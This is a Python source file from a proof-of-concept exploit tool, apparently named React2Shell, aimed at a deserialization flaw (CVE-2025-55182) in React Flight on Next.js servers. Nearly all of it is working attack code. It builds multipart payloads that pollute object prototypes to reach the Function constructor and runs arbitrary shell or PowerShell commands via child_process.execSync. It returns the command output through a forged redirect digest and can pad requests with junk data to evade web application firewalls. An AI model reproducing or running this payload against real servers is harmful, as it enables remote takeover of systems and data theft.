"""
React2Shell - CVE-2025-55182 PoC Tool
Developed by @BlackTechX011

Exploits prototype pollution in React Flight Protocol deserialization
to achieve Remote Code Execution on vulnerable Next.js applications.
"""
from typing import Tuple
import random
import string
from react2shell.utils.config import Config
from react2shell.utils.helpers import generate_random_string

class PayloadGenerator:
    def __init__(self, config: Config):
        self.config = config
        self.boundary = "----WebKitFormBoundary" + generate_random_string(16)

    def _generate_junk(self) -> str:
        if not self.config.waf_bypass:
            return ""
        
        size_bytes = self.config.waf_size * 1024
        param_name = generate_random_string(10)
        junk_data = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
        
        return (
            f"--{self.boundary}\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk_data}\r\n"
        )

    def get_safe_payload(self) -> Tuple[str, str]:
        """Returns body and content-type for safe check."""
        # This payload causes a specific error without RCE
        part0 = (
            f"--{self.boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f"{{}}\r\n"
            f"--{self.boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f'["$1:aa:aa"]\r\n'
            f"--{self.boundary}--"
        )
        return part0, f"multipart/form-data; boundary={self.boundary}"

    def get_rce_payload(self, cmd: str = None) -> Tuple[str, str]:
        """Returns body and content-type for RCE."""
        
        if not cmd:
            # Default check payload
            if self.config.windows:
                cmd = 'powershell -c \\\\\\"41*271\\\\\\"'
            else:
                cmd = 'echo $((41*271))'
        else:
             # Custom command
            if self.config.windows:
                escaped_cmd = cmd.replace('\\', '\\\\\\\\').replace('"', '\\\\\\"')
                cmd = f'powershell -c \\\\\\"{escaped_cmd}\\\\\\"'
            else:
                escaped_cmd = cmd.replace('\\', '\\\\').replace("'", "'\\''")
                cmd = escaped_cmd

        # Prefix payload to capture output
        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{cmd}',"
            f"{{'timeout':10000}}).toString().trim();"
            f"throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/cmd?out=${{res}};307;`}});"
        )

        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )

        parts = []
        
        # Add junk if enabled
        parts.append(self._generate_junk())

        parts.append(
            f"--{self.boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
        )
        parts.append(
            f"--{self.boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
        )
        parts.append(
            f"--{self.boundary}\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
        )
        parts.append(f"--{self.boundary}--")
        
        body = "".join(parts)
        return body, f"multipart/form-data; boundary={self.boundary}"
